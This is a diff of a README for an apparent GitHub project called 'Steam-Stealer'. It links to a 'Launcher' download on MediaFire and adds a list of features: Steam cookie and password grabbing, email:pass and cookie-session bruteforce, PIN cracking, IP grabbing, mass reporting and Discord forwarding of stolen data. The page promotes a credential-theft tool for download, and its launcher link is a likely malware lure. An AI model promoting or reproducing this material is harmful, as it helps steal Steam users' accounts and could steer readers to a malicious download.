@@ -1,3 +1,5 @@
+![1](https://github.com/Vewsim/Steam-Stealer/assets/157567689/2e0d041f-eb35-4adf-97e6-845c76a9beff)
+
 # 🗃[Launcher](https://mediafire.com/file_premium/utxrx50t9fcss6s/Project/file)
 
 # 📖Information:
@@ -10,4 +12,13 @@ If you cant get our software -
 
 #  Ｆｕｎｃｔｉ⚙️ｎｓ:
 
-![2](https://github.com/Vewsim/Steam-Stealer/assets/157567689/dc3140e0-bbf1-41b3-87f5-29cef6070d6d)
+* Steam Cookie-Session bruteforce
+* Steam email:pass bruteforce
+* Steam Cookie & Pass Grabber
+* Steam Mass Report
+* Steam IP Grabber 
+* Steam PIN Cracker
+* Steam Cookie Checker
+* Steam User to Discord
+* Steam Cookie Generator
+* Proxy Scrapper + Validator
